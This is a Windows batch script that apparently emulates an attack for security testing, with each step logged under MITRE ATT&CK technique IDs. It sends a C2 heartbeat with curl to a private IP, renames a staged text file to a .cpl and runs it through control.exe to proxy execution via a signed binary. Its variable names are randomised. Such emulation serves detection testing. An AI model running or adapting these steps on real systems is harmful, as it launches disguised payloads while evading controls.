@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET douyiw=%APPDATA%\8531\23b24481
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?8531-7
SET eykalkg=BALAM-S2B
SET fkesh=7
SET ecrfwq=exploren.txt
SET rgnpbq=8531

REM Computed paths using random names
SET yzvgka=%APPDATA%\!fkesh!
SET lfjkms=%yzvgka%\macula-simulations.log

echo [%DATE% %TIME%][DEBUG][!eykalkg!]: script_start>> "!lfjkms!" 2>nul

REM 1. C2 Heartbeat
echo [%DATE% %TIME%][DEBUG][!eykalkg!]: heartbeat_start>> "!lfjkms!" 2>nul
curl -k -s -o nul "!frytcn!"
SET azvbqx=1
IF !ERRORLEVEL! NEQ 0 SET azvbqx=0
echo [%DATE% %TIME%][DEBUG][!eykalkg!]: heartbeat_complete=!azvbqx!>> "!lfjkms!" 2>nul
echo [%DATE% %TIME%][!eykalkg!]: !fkesh!-!rgnpbq!-T1218|Signed Binary Proxy Execution=!azvbqx!:>> "!lfjkms!" 2>nul

REM 2. Change to output directory
echo [%DATE% %TIME%][DEBUG][!eykalkg!]: chdir_start>> "!lfjkms!" 2>nul
cd /d "!douyiw!" >nul 2>&1
SET khjwfg=1
IF !ERRORLEVEL! NEQ 0 SET khjwfg=0
echo [%DATE% %TIME%][DEBUG][!eykalkg!]: chdir_complete=!khjwfg!>> "!lfjkms!" 2>nul

REM 3. Rename file to CPL
echo [%DATE% %TIME%][DEBUG][!eykalkg!]: rename_start>> "!lfjkms!" 2>nul
ren "!ecrfwq!" file.cpl >nul 2>&1
SET plmknj=1
IF !ERRORLEVEL! NEQ 0 SET plmknj=0
echo [%DATE% %TIME%][DEBUG][!eykalkg!]: rename_complete=!plmknj!>> "!lfjkms!" 2>nul

REM 4. Execute CPL via control.exe
echo [%DATE% %TIME%][DEBUG][!eykalkg!]: cpl_execution_start>> "!lfjkms!" 2>nul
control.exe file.cpl
SET wqaxsc=1
IF !ERRORLEVEL! NEQ 0 SET wqaxsc=0
echo [%DATE% %TIME%][DEBUG][!eykalkg!]: cpl_execution_complete=!wqaxsc!>> "!lfjkms!" 2>nul
echo [%DATE% %TIME%][!eykalkg!]: !fkesh!-!rgnpbq!-T1218.002|Control Panel Items=!wqaxsc!:>> "!lfjkms!" 2>nul

echo [%DATE% %TIME%][DEBUG][!eykalkg!]: script_end>> "!lfjkms!" 2>nul